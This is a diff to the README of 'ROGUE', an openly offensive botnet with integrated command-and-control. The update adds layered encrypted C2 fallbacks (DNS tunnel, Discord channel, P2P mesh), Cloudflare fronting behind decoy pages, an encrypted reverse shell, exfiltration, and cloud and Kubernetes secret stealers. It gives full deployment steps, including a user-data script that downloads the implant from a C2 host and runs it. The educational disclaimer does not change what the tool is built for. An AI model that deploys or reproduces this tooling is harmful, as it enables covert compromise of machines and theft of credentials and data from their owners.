@@ -1,4 +1,4 @@
-# ROGUE - Botnet w/ Integrated C2 v3.2
+# ROGUE - Botnet w/ Integrated C2 v3.3
 
 ![ek0ms Banner](https://img.shields.io/badge/ek0ms-certified_ethcial_hacker-blue)
 
@@ -8,6 +8,167 @@
 ## Disclaimer: This tool is provided for educational purposes. Only use on systems you own or have written permission to test on.
 ---
 
+## What's New in v3.3 (Layered, Redundant, Encrypted)
+
+### End-to-End Encryption
+- **X25519 ECDH key exchange** (forward secrecy, fresh ephemeral keys per
+  session) -> HKDF-SHA256 -> **AES-256-GCM** AEAD on every single message.
+- **Deployment-scoped keys.** The operator secret and C2 static public key
+  are generated at first C2 run (`rogue_keys/`) and pinned into implants via
+  `rogue_v2_config.py` - never committed, never hardcoded.
+- **Replay protection** (monotonic per-direction sequence numbers),
+  tamper-evident frames, session expiry, daily-rotating mesh group key.
+- Implant identity = HMAC(secret, id) routing labels: no plaintext ids on the wire.
+- Both the v2 frame format and the earlier v1 format are accepted on the same endpoint.
+
+### Tiered C2 Fallbacks
+1. **HTTPS C2** - multi-host mirror list, per-host failover
+2. **DNS tunnel** - full-size frames chunked across TXT queries w/ EDNS0;
+   `payloads/dnstunnel.py` bridges DNS <-> the local C2 (never sees plaintext)
+3. **OOB channel** - operator-pushed commands via Discord/chat, psk-sealed
+   (`scripts/rogue_op.py seal`)
+4. **P2P mesh relay** - when nothing else works, beacon through peer implants
+
+Tier manager: per-tier cooldowns, exponential backoff w/ jitter, automatic
+recovery to lower tiers when the direct path returns.
+
+### Always-On Encrypted P2P Mesh
+- Every implant runs an encrypted UDP mesh listener alongside the direct-C2
+  channel (discovery via authenticated, encrypted announces).
+- Any node can relay any other node's traffic to a gateway -> C2. Relays see
+  only ciphertext (end-to-end X25519 between implant and C2).
+- The C2 learns mesh members from beacons and pushes peer lists back out.
+
+### Tests
+    python3 tests/selftest_v2.py   # crypto core: 25 checks
+    python3 tests/e2e_v2.py        # real C2+implant: 11 checks
+    python3 tests/e2e_tiers.py     # DNS + P2P relay tiers: 4 checks
+
+### New tooling
+- `scripts/rogue_keygen.py` - keys + ready-to-deploy implant config
+- `scripts/rogue_op.py` - `seal` (OOB commands) and `shell` (encrypted shell)
+- `scripts/sync_v2_core.py` - keep the embedded comms core in sync
+- Encrypted reverse shell on port 9001, `R2EX` encrypted exfiltration,
+  and the full payload suite: container escape, Kubernetes secret steal,
+  browser data extraction, copyfail LPE, DNS tunneling and more.
+
+---
+## Transports (tunnels, fronting, no-proxy)
+
+ROGUE v3.3 is transport-agnostic - `c2_hosts` is a list of base URLs and
+every frame is end-to-end encrypted, so pick any pipe:
+
+- **Cloudflare Worker fronting** (recommended): `deploy/cloudflare_worker.js`
+  routes your hidden hostname to the C2 and serves a decoy page to everyone
+  else. Pattern from churchofmalware noPROXY_c2s.
+- **Direct VPS on 443** behind Caddy/nginx - no third party in the path.
+- **cloudflared quick tunnel**: `ROGUE_TUNNEL=cloudflared python3 rogue_c2.py`
+- **DNS tunnel tier** - built in (Quickstart section 4).
+
+---
+## Quickstart — Deploying ROGUE v3.3
+
+### 1. Start the C2 (server side)
+```bash
+python3 rogue_c2.py          # or: ROGUE_KEYDIR=/srv/rogue/keys python3 rogue_c2.py
+```
+On first run the C2 generates its key material under `rogue_keys/`
+(`operator.secret`, `static_priv.bin`, `static_pub.b64`) and prints a ready
+to-paste implant config snippet. Keep that directory secret (`0700`).
+
+Two web interfaces are available:
+- `http://<c2>:4444/ops` - the ops dashboard (live bot grid, mesh peers,
+  event stream, command console - see "Ops Dashboard" below)
+- `http://<c2>:4444/admin` - the full admin panel (bot list, command queue,
+  payloads, cloud ops)
+
+Older v1-format implants remain supported on the same endpoint.
+
+### 2. Run the test suite (optional but recommended)
+```bash
+ROGUE_KEYDIR=/tmp/e2e_keys python3 tests/selftest_v2.py   # 25 checks
+ROGUE_KEYDIR=/tmp/e2e_keys python3 tests/e2e_v2.py        # 11 checks (real C2+implant)
+ROGUE_KEYDIR=/tmp/e2e_keys python3 tests/e2e_tiers.py     # 4 checks (DNS + P2P relay tiers)
+```
+
+### 3. Configure an implant
+Create `rogue_v2_config.py` **next to** `rogue_implant.py` on the target
+(easiest: `python3 scripts/rogue_keygen.py --config-out rogue_v2_config.py`
+on your box, then ship both files together). The snippet looks like:
+
+```python
+secret = '<from C2 output>'
+static_pub = '<from C2 output>'
+c2_hosts = ['https://YOUR_C2_HOST/']   # tier 0: direct HTTPS C2 (mirrors OK)
+dns_zone = ''                           # tier 1: 'c2.example.com' (see bridge below)
+dns_resolver = ''                       #         IP of your DNS bridge
+oob_read_url = ''                       # tier 3: channel URL (e.g. discord api)
+oob_webhook = ''                        #         result webhook URL
+oob_token = ''                          #         channel bot token
+p2p_ports = (7008, 7009, 7010, 7011)    # tier 2: mesh ports - always on
+legacy_fallback = True
+```
+
+Environment variables (`ROGUE_SECRET`, `ROGUE_STATIC_PUBLIC`, `ROGUE_C2_HOSTS`,
+`ROGUE_DNS_ZONE`, `ROGUE_DNS_RESOLVER`, `ROGUE_OOB_*`) override the file.
+Run the implant: `python3 rogue_implant.py`. It beacons on the HTTPS tier and
+automatically falls back tier-by-tier when the direct path dies.
+
+> Cloned VMs / reinstalls are handled automatically: each implant keeps a
+> random identity nonce in its hidden dir, so two machines can never collide
+> on the mesh or on the C2 session table.
+
+### 4. Optional tiers
+**DNS tier** — run the bridge on a host that can answer for your zone:
+```bash
+python3 payloads/dnstunnel.py --mode server --domain c2.example.com     --listen-port 53 --c2-url http://127.0.0.1:4444/
+```
+Then set `dns_zone` + `dns_resolver` in the implant config. The bridge only
+ever sees encrypted frames (crypto is end-to-end implant <-> C2).
+
+**OOB tier** — set `oob_read_url`/`oob_webhook`/`oob_token` (discord channel +
+webhook). Push commands into the channel with:
+```bash
+python3 scripts/rogue_op.py seal --secret <secret> "uname -a"
+```
+Results come back through the webhook, encrypted to the C2.
+
+### 5. Operator tools
+```bash
+python3 scripts/rogue_keygen.py --dir ./rogue_keys --config-out rogue_v2_config.py
+python3 scripts/rogue_op.py seal --secret <secret> "id"          # OOB command
+python3 scripts/rogue_op.py shell --secret <secret> C2_HOST:9001 # encrypted shell
+python3 scripts/sync_v2_core.py --check                          # core parity check
+```
+
+### 6. Verify
+- Beacons show in the admin panel (channel column = `v2`).
+- `python3 rogue_op.py shell` reaches the encrypted shell on port 9001.
+- Kill the direct C2 path in a lab and watch the implant fail over to DNS,
+  then to the P2P mesh, and recover automatically when the C2 comes back.
+
+---
+
+---
+## Ops Dashboard
+
+Open `http://<c2>:4444/ops` in a browser. The dashboard refreshes every 2.5
+seconds and shows live C2 state with no external dependencies:
+
+- Stat cards: bots online / total, mesh peers, queued commands, results,
+  server uptime
+- Bot grid: online state dot, channel tag (v2 / v1), IP, cloud provider,
+  beacon / command / result counters, pending-queue badges
+- Mesh peer panel with gateway flags (labels are pseudonymous HMAC ids)
+- Scrolling event stream: hello, beacon, command, result with relative
+  timestamps
+- Command console: pick a bot, type a command, Enter to send - posts to the
+  `/command` API and shows the queue status
+
+Machine-readable state is at `GET /ops/api` (JSON: `bots`, `peers`, `events`,
+`stats`, `server`). The full legacy admin panel remains at `/admin`.
+
+---
 ## What's New in v3.2
 
 ### **Cloud-Aware Implant & C2 (NEW!)**
@@ -93,7 +254,7 @@ Based on detected environment:
 - Kubernetes cron jobs
 
 ### **Cloud Operations Interface**
-Access via: `http://localhost:4444/admin` → "Cloud Ops" tab
+Access via: `http://localhost:4444/admin`  "Cloud Ops" tab
 
 #### **Cloud Detection**
 ```bash
@@ -168,19 +329,6 @@ source rogue_env/bin/activate
 pip3 install pycryptodome flask requests psutil setproctitle netifaces paramiko pynput boto3 azure-identity google-cloud-storage kubernetes pyautogui python-nmap secretstorage
 ```
 
-### **Ngrok Setup**
-```bash
-# Download and install ngrok
-wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
-tar -xvzf ngrok-v3-stable-linux-amd64.tgz
-sudo mv ngrok /usr/local/bin/
-
-# Set up authentication
-ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
-```
-
----
-
 ## Quick Start Guide
 
 ### **1. Start C2 Server** (Control Center)
@@ -195,11 +343,12 @@ python3 rogue_c2.py
 ============================================================
 [+] Exfil listener started on port 9091
 [+] Reverse shell listener started on port 9001
-[*] Starting ngrok tunnel...
+[*] No tunnel autostarted (ROGUE_TUNNEL=none). Point c2_hosts at a direct
+    host, CDN-fronted domain, or tunnel URL - see docs/TRANSPORTS.md
 [+] C2 SERVER IS LIVE!
-[NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
-[NGROK] Hostname: your-subdomain.ngrok-free.dev
-[NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
+[TUNNEL] C2 URL: http://localhost:4444
+[TUNNEL] Hostname: localhost
+[TUNNEL] Payloads: http://localhost:4444/payloads/
 [ADMIN] Web Panel: http://localhost:4444/admin
 [CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape, K8s Stealer
 [ADVANCED] 4 Advanced Payloads: Process Injection, File Hider, Cron Persist, Competitor Cleaner
@@ -210,9 +359,9 @@ python3 rogue_c2.py
 ### **2. Configure Implant**
 Edit `rogue_implant.py` with your C2 details:
 ```python
-C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
+C2_HOST = 'c2.example.com'
 C2_PORT = 4444
-PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
+PAYLOAD_REPO = "https://c2.example.com/payloads/"
 ```
 
 ### **3. Deploy Implants**
@@ -227,7 +376,7 @@ python3 rogue_implant.py
 # Deploy to AWS EC2 via user-data
 cat > user-data.sh << 'EOF'
 #!/bin/bash
-wget https://your-ngrok-subdomain.ngrok-free.dev/payloads/rogue_implant.py -O /tmp/rogue.py
+wget https://c2.example.com/payloads/rogue_implant.py -O /tmp/rogue.py
 python3 /tmp/rogue.py &
 EOF
 
@@ -358,7 +507,7 @@ trigger_logclean        # System log cleaning
 
 #### **Tab 7: Server Status**
 - Server uptime
-- Ngrok tunnel status
+- Tunnel status (public URL when an outbound tunnel is active)
 - Active bot count
 - System resource monitoring
 - Advanced payloads count
@@ -950,21 +1099,10 @@ curl -s -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/servic
 
 ### **General Troubleshooting**
 
-#### **Ngrok Connection Issues:**
-```bash
-# Check ngrok status
-curl http://localhost:4040/api/tunnels
-
-# Restart ngrok
-pkill ngrok
-ngrok http 4444
-sleep 5
-```
-
 #### **Implant Not Connecting:**
 ```bash
 # Test C2 connectivity from target
-curl -k https://your-c2.ngrok-free.dev
+curl -k https://c2.example.com
 
 # Check implant logs
 cat ~/.cache/.rogue/.implant.log 2>/dev/null
